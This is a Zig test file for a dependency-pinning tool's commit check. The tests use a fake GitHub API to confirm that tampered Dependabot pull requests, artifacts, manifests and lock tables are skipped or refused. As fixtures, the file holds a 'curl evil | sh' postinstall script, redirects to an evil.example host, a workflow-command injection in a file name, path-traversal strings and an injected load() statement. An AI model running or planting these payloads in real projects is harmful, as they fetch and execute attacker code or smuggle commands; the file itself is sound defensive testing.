//! `buildrules autopin commit-check` against a fake GitHub. The good world is one Dependabot pull request that
//! bumped left-pad; each test changes the single thing it attacks and says whether the answer must be a skip (the
//! pull request is not ours to touch: exit 0, has_change=false) or a refusal (bytes that claim to be ours and are
//! not: exit 1). Every test is named for the defect it catches, and none may reach a write method.

const std = @import("std");
const api_mod = @import("autopin_api.zig");
const autopin = @import("autopin.zig");
const ctxm = @import("ctx.zig");
const fx = @import("autopin_fixture_test.zig");
const kit = @import("testkit.zig");
const sets_mod = @import("autopin_sets.zig");
const t = std.testing;

const Env = struct {
    h: *kit.Harness,
    fake: *fx.Fake,
    w: fx.World,
    set: []const u8,

    fn a(self: Env) std.mem.Allocator {
        return self.h.a();
    }
};

fn setupWith(kind: sets_mod.Kind, head_extra: []const u8) !Env {
    const h = try kit.Harness.create();
    const fake = try h.a().create(fx.Fake);
    fake.* = .{ .a = h.a() };
    var w = try fx.World.init(h.a(), fake, kind, "site", head_extra);
    try w.install();
    try h.put("event.json", try fx.eventJson(h.a(), 1, fx.head));
    return .{ .h = h, .fake = fake, .w = w, .set = if (kind == .buildrules_lock) "site=buildrules-lock" else "site=pins-lock" };
}

fn setup(kind: sets_mod.Kind) !Env {
    return setupWith(kind, "");
}

fn runCheck(env: *Env) kit.Run {
    autopin.api_override = env.fake.api();
    env.h.tmp.dir.deleteFile("gh_out") catch {};
    return env.h.run(&.{ "autopin", "commit-check", "--event", "event.json", "--out", "checked", "--set", env.set, "--app-login", "autopin-app[bot]", "--github-output", "gh_out" });
}

fn expectSkip(env: *Env, needle: []const u8) !void {
    const r = runCheck(env);
    errdefer std.debug.print("out: {s}\nerr: {s}\n", .{ r.out, r.err });
    try t.expectEqual(@as(u8, 0), r.code);
    try t.expect(kit.contains(r.out, "autopin: skip: "));
    try t.expect(kit.contains(r.out, needle));
    try t.expectEqualStrings("has_change=false\n", env.h.read("gh_out"));
    try t.expect(!env.h.has("checked/site/buildrules.lock.bzl") and !env.h.has("checked/site/pins.lock.bzl"));
    try t.expectEqual(@as(usize, 0), env.fake.count(.POST) + env.fake.count(.PATCH));
}

fn expectRefusal(env: *Env, needle: []const u8) !void {
    const r = runCheck(env);
    errdefer std.debug.print("out: {s}\nerr: {s}\n", .{ r.out, r.err });
    try t.expectEqual(@as(u8, 1), r.code);
    try t.expect(kit.contains(r.err, "refused: "));
    try t.expect(kit.contains(r.err, needle));
    try t.expectEqualStrings("has_change=false\n", env.h.read("gh_out"));
    try t.expect(!env.h.has("checked/site/buildrules.lock.bzl") and !env.h.has("checked/site/pins.lock.bzl"));
    try t.expectEqual(@as(usize, 0), env.fake.count(.POST) + env.fake.count(.PATCH));
}

fn finish(env: *Env) void {
    autopin.api_override = null;
    env.h.destroy();
}

const pulls = "repos/" ++ fx.repo ++ "/pulls/7";
const commits_1 = pulls ++ "/commits?per_page=100&page=1";
const files_1 = pulls ++ "/files?per_page=100&page=1";
const files_2 = pulls ++ "/files?per_page=100&page=2";
const lock_key = "repos/" ++ fx.repo ++ "/contents/site/package-lock.json?ref=" ++ fx.head;

/// Replaces the artifact with a zip of this manifest and this table.
fn withArtifact(env: *Env, manifest: []const u8, table_text: []const u8) !void {
    env.fake.put(.GET, fx.blob_url, 200, try fx.zipOf(env.a(), &.{ .{ .name = "manifest.json", .data = manifest }, .{ .name = env.w.table_path, .data = table_text } }));
}

fn manifestFor(env: *Env, head_sha: []const u8, table_text: []const u8) ![]u8 {
    const digest = try ctxm.sha256Hex(env.a(), table_text);
    return std.fmt.allocPrint(env.a(), "{{\"pr\":7,\"head_sha\":\"{s}\",\"base_sha\":\"{s}\",\"files\":[{{\"path\":\"{s}\",\"sha256\":\"{s}\"}}]}}", .{ head_sha, fx.base, env.w.table_path, digest });
}

fn withTable(env: *Env, table_text: []const u8) !void {
    try withArtifact(env, try manifestFor(env, fx.head, table_text), table_text);
}

test "check: a bumped lock gives the table to commit, a plan, has_change=true, and reads only" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 0), r.code);
    try t.expectEqualStrings(env.w.table_new, env.h.read("checked/site/buildrules.lock.bzl"));
    try t.expectEqualStrings("has_change=true\n", env.h.read("gh_out"));
    const plan = env.h.read("checked/plan.json");
    try t.expect(kit.contains(plan, "\"pr\":7"));
    try t.expect(kit.contains(plan, "\"branch\":\"" ++ fx.branch ++ "\""));
    try t.expect(kit.contains(plan, "\"files\":[\"site/buildrules.lock.bzl\"]"));
    try t.expectEqual(@as(usize, 0), env.fake.count(.POST) + env.fake.count(.PATCH));
    // The artifact was fetched in two hops and the second carried no Authorization.
    var second = false;
    for (env.fake.log.items) |l| if (std.mem.eql(u8, l.key, fx.blob_url)) {
        second = true;
        try t.expect(!l.auth);
    };
    try t.expect(second);
}

test "check: a pins.lock.bzl directory works the same way, and keeps the head table's header" {
    var env = try setup(.pins_lock);
    defer finish(&env);
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 0), r.code);
    const written = env.h.read("checked/site/pins.lock.bzl");
    try t.expectEqualStrings(env.w.table_new, written);
    try t.expect(std.mem.startsWith(u8, written, fx.pins_prefix));
}

test "check: an artifact whose table is already what the repository holds changes nothing (a rerun is zero diff)" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    // The head already holds the new table: the commit happened and compute ran again.
    try env.w.file(env.w.table_path, fx.head, env.w.table_new);
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 0), r.code);
    try t.expectEqualStrings("has_change=false\n", env.h.read("gh_out"));
    try t.expect(!env.h.has("checked/site/buildrules.lock.bzl"));
    try t.expect(kit.contains(env.h.read("checked/plan.json"), "\"files\":[]"));
}

test "check: the head sha in the artifact's manifest is not the pull request's head: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    try withArtifact(&env, try manifestFor(&env, "7" ** 40, env.w.table_new), env.w.table_new);
    try expectSkip(&env, "the pull request moved");
}

test "check: the head sha of the event is not the pull request's head: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    try env.h.put("event.json", try fx.eventJson(env.a(), 1, "8" ** 40));
    try expectSkip(&env, "the pull request moved");
}

test "check: the pull request's head moved on while the manifest and the event agree: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, pulls, 200, try fx.prJson(env.a(), "open", "dependabot[bot]", fx.repo, "main", "9" ** 40));
    try expectSkip(&env, "the pull request moved");
}

test "check: a pull request that is closed: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, pulls, 200, try fx.prJson(env.a(), "closed", "dependabot[bot]", fx.repo, "main", fx.head));
    try expectSkip(&env, "not open");
}

test "check: a pull request by someone else: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, pulls, 200, try fx.prJson(env.a(), "open", "mallory", fx.repo, "main", fx.head));
    try expectSkip(&env, "not by Dependabot");
}

test "check: a head on a fork: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, pulls, 200, try fx.prJson(env.a(), "open", "dependabot[bot]", "mallory/demo", "main", fx.head));
    try expectSkip(&env, "not on this repository");
}

test "check: a pull request whose base is not the default branch: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, pulls, 200, try fx.prJson(env.a(), "open", "dependabot[bot]", fx.repo, "release", fx.head));
    try expectSkip(&env, "default branch");
}

test "check: a branch that is not a Dependabot npm branch: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const odd = try std.mem.replaceOwned(u8, env.a(), try fx.prJson(env.a(), "open", "dependabot[bot]", fx.repo, "main", fx.head), fx.branch, "dependabot/npm_and_yarn/../../main");
    env.fake.put(.GET, pulls, 200, odd);
    try expectSkip(&env, "not a Dependabot npm branch");
}

test "check: a pull request the run does not belong to: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const other = try std.mem.replaceOwned(u8, env.a(), try fx.eventJson(env.a(), 1, fx.head), "\"number\":7", "\"number\":8");
    try env.h.put("event.json", other);
    try expectSkip(&env, "not one the run belongs to");
}

test "check: the repository id is not the event's: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, "repos/" ++ fx.repo, 200, "{\"id\":43,\"default_branch\":\"main\"}");
    try expectSkip(&env, "repository id");
}

test "check: a commit by a human: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, commits_1, 200, "[{\"author\":{\"login\":\"dependabot[bot]\"}},{\"author\":{\"login\":\"mallory\"}}]");
    try expectSkip(&env, "a commit is by mallory");
}

test "check: a commit with no GitHub author: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, commits_1, 200, "[{\"author\":null}]");
    try expectSkip(&env, "no GitHub author");
}

test "check: a commit by another App (not ours) is a skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, commits_1, 200, "[{\"author\":{\"login\":\"other-app[bot]\"}}]");
    try expectSkip(&env, "a commit is by other-app[bot]");
}

test "check: a commit by the autopin App is fine" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, commits_1, 200, "[{\"author\":{\"login\":\"dependabot[bot]\"}},{\"author\":{\"login\":\"autopin-app[bot]\"}}]");
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 0), r.code);
    try t.expectEqualStrings("has_change=true\n", env.h.read("gh_out"));
}

fn hundredCommits(a: std.mem.Allocator) ![]u8 {
    var out = std.ArrayList(u8).empty;
    try out.append(a, '[');
    for (0..100) |i| {
        if (i > 0) try out.append(a, ',');
        try out.appendSlice(a, "{\"author\":{\"login\":\"dependabot[bot]\"}}");
    }
    try out.append(a, ']');
    return out.items;
}

test "check: a pull request with more than 100 commits: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, commits_1, 200, try hundredCommits(env.a()));
    env.fake.put(.GET, pulls ++ "/commits?per_page=100&page=2", 200, "[{\"author\":{\"login\":\"dependabot[bot]\"}}]");
    try expectSkip(&env, "more than 100 commits");
}

test "check: exactly 100 commits are read to the end and accepted" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, commits_1, 200, try hundredCommits(env.a()));
    env.fake.put(.GET, pulls ++ "/commits?per_page=100&page=2", 200, "[]");
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 0), r.code);
    try t.expectEqualStrings("has_change=true\n", env.h.read("gh_out"));
}

test "check: an error reading the commit list: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, commits_1, 502, "{}");
    try expectSkip(&env, "read to its end");
}

fn filePage(a: std.mem.Allocator, first: []const u8, count: usize) ![]u8 {
    var out = std.ArrayList(u8).empty;
    try out.append(a, '[');
    try out.print(a, "{{\"filename\":\"{s}\"}}", .{first});
    for (1..count) |_| try out.appendSlice(a, ",{\"filename\":\"site/package-lock.json\"}");
    try out.append(a, ']');
    return out.items;
}

test "check: a .github file on the second page of the file list: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, files_1, 200, try filePage(env.a(), "site/package.json", 100));
    env.fake.put(.GET, files_2, 200, "[{\"filename\":\".github/workflows/ci.yml\"}]");
    try expectSkip(&env, ".github/workflows/ci.yml");
}

test "check: a rename out of .github on the second page of the file list: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, files_1, 200, try filePage(env.a(), "site/package.json", 100));
    env.fake.put(.GET, files_2, 200, "[{\"filename\":\"site/package-lock.json\",\"previous_filename\":\".github/workflows/ci.yml\"}]");
    try expectSkip(&env, ".github/workflows/ci.yml");
}

test "check: an error on the second page of the file list: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, files_1, 200, try filePage(env.a(), "site/package.json", 100));
    env.fake.put(.GET, files_2, 500, "{}");
    try expectSkip(&env, "read to its end");
}

test "check: a file list as long as the API allows may be cut: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const full = try filePage(env.a(), "site/package.json", 100);
    var page: usize = 1;
    while (page <= 30) : (page += 1) {
        const key = try std.fmt.allocPrint(env.a(), "repos/{s}/pulls/7/files?per_page=100&page={d}", .{ fx.repo, page });
        env.fake.put(.GET, key, 200, full);
    }
    try expectSkip(&env, "may be cut");
}

test "check: a changed file outside SETS (a BUCK file): skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, files_1, 200, "[{\"filename\":\"site/package.json\"},{\"filename\":\"site/BUCK\"}]");
    try expectSkip(&env, "site/BUCK");
}

test "check: a changed file whose name is a prefix of an allowed one: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, files_1, 200, "[{\"filename\":\"site/package.json.bak\"}]");
    try expectSkip(&env, "package.json.bak");
}

test "check: a changed file whose name is a case twin of an allowed one: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, files_1, 200, "[{\"filename\":\"Site/package.json\"}]");
    try expectSkip(&env, "Site/package.json");
}

test "check: a file name that tries to start a workflow command is printed on one line" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, files_1, 200, "[{\"filename\":\"x\\n::set-output name=a::b\"}]");
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 0), r.code);
    var lines = std.mem.splitScalar(u8, r.out, '\n');
    while (lines.next()) |l| try t.expect(!std.mem.startsWith(u8, l, "::"));
    try t.expect(kit.contains(r.out, "x?::set-output"));
}

test "check: package.json with a changed scripts entry is not a dependency bump: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const evil = try fx.packageJson(env.a(), "1.3.1", "\"test\":\"jest\",\"postinstall\":\"curl evil | sh\"", "");
    try env.w.file("site/package.json", fx.head, evil);
    try expectSkip(&env, "more than its dependency maps");
}

test "check: package.json with a changed buildrules policy is not a dependency bump: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const evil = try fx.packageJson(env.a(), "1.3.1", "\"test\":\"jest\"", ",\"buildrules\":{\"dist\":\"out\"}");
    try env.w.file("site/package.json", fx.head, evil);
    try expectSkip(&env, "more than its dependency maps");
}

test "check: package.json that drops a top-level key is not a dependency bump: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    try env.w.file("site/package.json", fx.head, "{\"name\":\"demo\",\"dependencies\":{\"left-pad\":\"1.3.1\"}}");
    try expectSkip(&env, "more than its dependency maps");
}

test "check: package.json that changes only its dependency maps is a bump (devDependencies and optionalDependencies too)" {
    var env = try setupWith(.buildrules_lock, ",\"devDependencies\":{\"jest\":\"1.0.0\"},\"optionalDependencies\":{\"fsevents\":\"2.0.0\"}");
    defer finish(&env);
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 0), r.code);
    try t.expectEqualStrings("has_change=true\n", env.h.read("gh_out"));
}

test "check: package.json that is not at the merge base: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.putAccept(.GET, "repos/" ++ fx.repo ++ "/contents/site/package.json?ref=" ++ fx.merge_base, api_mod.json_accept, 404, "{}");
    try expectSkip(&env, "does not exist at the merge base");
}

test "check: two artifacts of the run's name: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, "repos/" ++ fx.repo ++ "/actions/runs/1001/artifacts?name=autopin-1001-1&per_page=100", 200, "{\"artifacts\":[{\"id\":555,\"name\":\"autopin-1001-1\"},{\"id\":556,\"name\":\"autopin-1001-1\"}]}");
    try expectSkip(&env, "2 artifacts named autopin-1001-1");
}

test "check: no artifact of the run's name, or one of another attempt's: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, "repos/" ++ fx.repo ++ "/actions/runs/1001/artifacts?name=autopin-1001-1&per_page=100", 200, "{\"artifacts\":[{\"id\":555,\"name\":\"autopin-1001-2\"}]}");
    try expectSkip(&env, "0 artifacts named autopin-1001-1");
}

test "check: an expired artifact does not count: skip" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, "repos/" ++ fx.repo ++ "/actions/runs/1001/artifacts?name=autopin-1001-1&per_page=100", 200, "{\"artifacts\":[{\"id\":555,\"name\":\"autopin-1001-1\",\"expired\":true}]}");
    try expectSkip(&env, "0 artifacts");
}

test "check: a re-run (attempt 2) takes its own artifact and ignores attempt 1's" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    try env.h.put("event.json", try fx.eventJson(env.a(), 2, fx.head));
    env.fake.put(.GET, "repos/" ++ fx.repo ++ "/actions/runs/1001/artifacts?name=autopin-1001-2&per_page=100", 200, "{\"artifacts\":[{\"id\":777,\"name\":\"autopin-1001-1\"},{\"id\":555,\"name\":\"autopin-1001-2\"}]}");
    const r = runCheck(&env);
    try t.expectEqual(@as(u8, 0), r.code);
    try t.expectEqualStrings("has_change=true\n", env.h.read("gh_out"));
    // It downloaded 555, not the attempt-1 artifact 777.
    try t.expect(env.fake.requested(.GET, "repos/" ++ fx.repo ++ "/actions/artifacts/555/zip"));
    try t.expect(!env.fake.requested(.GET, "repos/" ++ fx.repo ++ "/actions/artifacts/777/zip"));
}

test "check: the artifact URL redirects to a host off the allow-list: refused, and nothing is requested there" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.putRedirect("repos/" ++ fx.repo ++ "/actions/artifacts/555/zip", "https://evil.example/zip");
    try expectRefusal(&env, "download failed: RedirectNotAllowed");
    try t.expect(!env.fake.requested(.GET, "https://evil.example/zip"));
}

test "check: an artifact that is not a zip: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, fx.blob_url, 200, "this is not a zip file, it is far too short to be one anyway.");
    try expectRefusal(&env, "not an acceptable zip");
}

test "check: an artifact with a symlink member: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const zip_copy = try env.a().dupe(u8, env.w.zip_bytes);
    // Mark the first central entry as a symlink (Unix mode 0o120777 in the high half of the external attributes).
    const cd_off = std.mem.readInt(u32, zip_copy[zip_copy.len - 6 ..][0..4], .little);
    std.mem.writeInt(u32, zip_copy[cd_off + 38 ..][0..4], 0o120777 << 16, .little);
    env.fake.put(.GET, fx.blob_url, 200, zip_copy);
    try expectRefusal(&env, "SymlinkOrSpecial");
}

test "check: a zip member the manifest does not list: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const manifest = "{\"pr\":7,\"head_sha\":\"" ++ fx.head ++ "\",\"base_sha\":\"" ++ fx.base ++ "\",\"files\":[]}";
    try withArtifact(&env, manifest, env.w.table_new);
    try expectRefusal(&env, "does not match its manifest");
}

test "check: a manifest with a path outside SETS: refused, and the path is never written" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const evil = "{\"pr\":7,\"head_sha\":\"" ++ fx.head ++ "\",\"base_sha\":\"" ++ fx.base ++ "\",\"files\":[{\"path\":\".github/workflows/ci.yml\",\"sha256\":\"" ++ "a" ** 64 ++ "\"}]}";
    env.fake.put(.GET, fx.blob_url, 200, try fx.zipOf(env.a(), &.{ .{ .name = "manifest.json", .data = evil }, .{ .name = ".github/workflows/ci.yml", .data = "x" } }));
    try expectRefusal(&env, "not an acceptable zip");
    try t.expect(!env.h.has("checked/.github/workflows/ci.yml"));
}

test "check: a manifest that lists a path outside SETS for a member that is inside: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const evil = "{\"pr\":7,\"head_sha\":\"" ++ fx.head ++ "\",\"base_sha\":\"" ++ fx.base ++ "\",\"files\":[{\"path\":\"site/../x\",\"sha256\":\"" ++ "a" ** 64 ++ "\"}]}";
    try withArtifact(&env, evil, env.w.table_new);
    try expectRefusal(&env, "the manifest is not acceptable: PathNotInSets");
}

test "check: a manifest whose digest is not its member's: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const manifest = "{\"pr\":7,\"head_sha\":\"" ++ fx.head ++ "\",\"base_sha\":\"" ++ fx.base ++ "\",\"files\":[{\"path\":\"site/buildrules.lock.bzl\",\"sha256\":\"" ++ "0" ** 64 ++ "\"}]}";
    try withArtifact(&env, manifest, env.w.table_new);
    try expectRefusal(&env, "does not match its manifest: Sha256Mismatch");
}

test "check: a manifest with a duplicate key: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const manifest = "{\"pr\":7,\"pr\":8,\"head_sha\":\"" ++ fx.head ++ "\",\"base_sha\":\"" ++ fx.base ++ "\",\"files\":[]}";
    try withArtifact(&env, manifest, env.w.table_new);
    try expectRefusal(&env, "the manifest is not acceptable: DuplicateKey");
}

test "check: a manifest whose pr is a string: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const manifest = "{\"pr\":\"7\",\"head_sha\":\"" ++ fx.head ++ "\",\"base_sha\":\"" ++ fx.base ++ "\",\"files\":[]}";
    try withArtifact(&env, manifest, env.w.table_new);
    try expectRefusal(&env, "PrNotInteger");
}

test "check: a table in the artifact with a PACKAGE block the head package.json does not produce: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const tampered = try std.mem.replaceOwned(u8, env.a(), env.w.table_new, "\"test\": \"jest\"", "\"test\": \"curl evil | sh\"");
    try t.expect(!std.mem.eql(u8, tampered, env.w.table_new));
    try withTable(&env, tampered);
    try expectRefusal(&env, "not what the generator makes");
}

test "check: a pins.lock.bzl whose header or PINS block was changed: refused" {
    var env = try setup(.pins_lock);
    defer finish(&env);
    try withTable(&env, try std.mem.replaceOwned(u8, env.a(), env.w.table_new, "PINS = {}", "PINS = {\"evil\": {}}"));
    try expectRefusal(&env, "not what the generator makes");
}

test "check: a table with a load statement in front: refused" {
    var env = try setup(.pins_lock);
    defer finish(&env);
    try withTable(&env, try std.mem.concat(env.a(), u8, &.{ "load(\"//evil:x.bzl\", \"y\")\n", env.w.table_new }));
    try expectRefusal(&env, "not what the generator makes");
}

test "check: a table with a row that is not the generator's grammar: refused" {
    var env = try setup(.pins_lock);
    defer finish(&env);
    try withTable(&env, try std.mem.replaceOwned(u8, env.a(), env.w.table_new, "        \"size\": 12,\n", "        \"size\": 12,\n        \"extra\": \"x\",\n"));
    try expectRefusal(&env, "not the generator's grammar");
}

test "check: a table with no NPM block: refused" {
    var env = try setup(.pins_lock);
    defer finish(&env);
    try withTable(&env, "# nothing\n");
    try expectRefusal(&env, "has no NPM block");
}

test "check: a table row whose url is not the registry's canonical url: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const tampered = try std.mem.replaceOwned(u8, env.a(), env.w.table_new, "https://registry.npmjs.org/left-pad/-/left-pad-1.3.1.tgz", "https://evil.example/left-pad-1.3.1.tgz");
    try withTable(&env, tampered);
    try expectRefusal(&env, "does not match the lock");
}

test "check: a table row whose sri512 is not the lock's integrity: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    // left-pad 1.3.1 has sri_a in the lock; the row claims sri_b.
    const from = "\"sri512\": \"" ++ fx.sri_a ++ "\",\n        \"sha256\": \"" ++ fx.sha_b ++ "\",\n        \"size\": 12";
    const to = "\"sri512\": \"" ++ fx.sri_b ++ "\",\n        \"sha256\": \"" ++ fx.sha_b ++ "\",\n        \"size\": 12";
    const tampered = try std.mem.replaceOwned(u8, env.a(), env.w.table_new, from, to);
    try t.expect(!std.mem.eql(u8, tampered, env.w.table_new));
    try withTable(&env, tampered);
    try expectRefusal(&env, "does not match the lock");
}

test "check: a table that lacks a row the lock calls for: refused" {
    var env = try setup(.pins_lock);
    defer finish(&env);
    const start = std.mem.indexOf(u8, env.w.table_new, "    \"left-pad@1.3.1\": {").?;
    const end = std.mem.indexOfPos(u8, env.w.table_new, start, "    },\n").? + "    },\n".len;
    try withTable(&env, try std.mem.concat(env.a(), u8, &.{ env.w.table_new[0..start], env.w.table_new[end..] }));
    try expectRefusal(&env, "does not match the lock");
}

test "check: a table with a row the lock does not have: refused" {
    var env = try setup(.pins_lock);
    defer finish(&env);
    // The old table (left-pad 1.3.0) is not what the bumped lock calls for.
    try withTable(&env, env.w.table_head);
    try expectRefusal(&env, "does not match the lock");
}

test "check: a lock at the head with an alias entry: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const hostile = try fx.lockJson(env.a(), "1.3.1", ",\"node_modules/alias\":{\"name\":\"real\",\"version\":\"1.0.0\",\"resolved\":\"https://registry.npmjs.org/real/-/real-1.0.0.tgz\",\"integrity\":\"" ++ fx.sri_a ++ "\"}");
    try env.w.file("site/package-lock.json", fx.head, hostile);
    try expectRefusal(&env, "the lock is not acceptable");
}

test "check: a stale PACKAGE_LOCK_SHA256 (the lock at the head is not the lock the table was made from): refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    // Same entries, other bytes: every row still binds, but the digest in the table is of the other file.
    try env.w.file("site/package-lock.json", fx.head, try std.mem.concat(env.a(), u8, &.{ env.w.lock_head, "\n" }));
    try expectRefusal(&env, "not what the generator makes");
}

test "check: a raw read with an empty body for a file that is not empty: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.putAccept(.GET, lock_key, api_mod.raw_accept, 200, "");
    try expectRefusal(&env, "RawMismatch");
}

test "check: a raw read that answers with the JSON envelope instead of the bytes: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.putAccept(.GET, lock_key, api_mod.raw_accept, 200, "{\"type\":\"file\",\"content\":\"e30=\"}");
    try expectRefusal(&env, "RawMismatch");
}

test "check: a raw read whose bytes have the right length and another blob hash: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const flipped = try env.a().dupe(u8, env.w.lock_head);
    flipped[flipped.len - 3] = if (flipped[flipped.len - 3] == 'x') 'y' else 'x';
    env.fake.putAccept(.GET, lock_key, api_mod.raw_accept, 200, flipped);
    try expectRefusal(&env, "RawMismatch");
}

test "check: a raw read whose size differs from the one the metadata gave: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.putAccept(.GET, lock_key, api_mod.raw_accept, 200, try std.mem.concat(env.a(), u8, &.{ env.w.lock_head, " " }));
    try expectRefusal(&env, "RawMismatch");
}

test "check: a file that is not a file at the head (a symlink): refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.putAccept(.GET, lock_key, api_mod.json_accept, 200, "{\"type\":\"symlink\",\"sha\":\"" ++ "1" ** 40 ++ "\",\"size\":3}");
    try expectRefusal(&env, "NotAFile");
}

test "check: the table is missing at the head: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.putAccept(.GET, "repos/" ++ fx.repo ++ "/contents/site/buildrules.lock.bzl?ref=" ++ fx.head, api_mod.json_accept, 404, "{\"message\":\"Not Found\"}");
    try expectRefusal(&env, "no such file at the head commit");
}

test "check: an API answer other than 200 for the pull request: refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    env.fake.put(.GET, pulls, 403, "{\"message\":\"forbidden\"}");
    try expectRefusal(&env, "answered 403");
}

test "check: an event that is not the compute workflow's own run is a skip, whatever else it says" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    const cases = [_][2][]const u8{
        .{ "\"conclusion\":\"success\"", "\"conclusion\":\"failure\"" },
        .{ "\"event\":\"pull_request\"", "\"event\":\"push\"" },
        .{ ".github/workflows/autopin-compute.yml", ".github/workflows/evil.yml" },
        .{ "\"head_repository\":{\"id\":42", "\"head_repository\":{\"id\":99" },
        .{ "\"actor\":{\"login\":\"dependabot[bot]\"}", "\"actor\":{\"login\":\"mallory\"}" },
        .{ "\"triggering_actor\":{\"login\":\"dependabot[bot]\"}", "\"triggering_actor\":{\"login\":\"mallory\"}" },
    };
    const good = try fx.eventJson(env.a(), 1, fx.head);
    for (cases) |c| {
        try t.expect(kit.contains(good, c[0]));
        try env.h.put("event.json", try std.mem.replaceOwned(u8, env.a(), good, c[0], c[1]));
        try expectSkip(&env, "");
        try t.expectEqual(@as(usize, 0), env.fake.log.items.len);
    }
}

test "check: a non-empty --out is refused" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    try env.h.put("checked/leftover", "x");
    try expectRefusal(&env, "not empty");
}

test "check: usage errors exit 2, and a missing token is a failure, not a guess" {
    var env = try setup(.buildrules_lock);
    defer finish(&env);
    autopin.api_override = env.fake.api();
    const cases = [_][]const []const u8{
        &.{ "autopin", "commit-check", "--out", "o", "--set", "site=pins-lock" },
        &.{ "autopin", "commit-check", "--event", "e", "--set", "site=pins-lock" },
        &.{ "autopin", "commit-check", "--event", "e", "--out", "o" },
        &.{ "autopin", "commit-check", "--event", "e", "--out", "o", "--set", "site=pins-lock" },
        &.{ "autopin", "commit-check", "--event", "e", "--out", "o", "--set", "site=pins-lock", "--app-login", "mallory" },
        &.{ "autopin", "commit-check", "--bogus" },
        &.{ "autopin", "commit-check", "--event" },
        &.{ "autopin", "commit-check", "--event", "e", "--out", "o", "--set", "x=other" },
    };
    for (cases) |argv| try t.expectEqual(@as(u8, 2), env.h.run(argv).code);
    const help = env.h.run(&.{ "autopin", "commit-check", "-h" });
    try t.expectEqual(@as(u8, 0), help.code);
    try t.expect(kit.contains(help.out, "--github-output FILE"));
    autopin.api_override = null;
    // With a token in the environment this would reach the network; the farm's actions run with none.
    if (!std.process.hasEnvVarConstant("GH_TOKEN")) {
        const no_token = env.h.run(&.{ "autopin", "commit-check", "--event", "event.json", "--out", "o", "--set", "site=pins-lock", "--app-login", "autopin-app[bot]" });
        try t.expectEqual(@as(u8, 1), no_token.code);
        try t.expect(kit.contains(no_token.err, "GH_TOKEN"));
    }
}

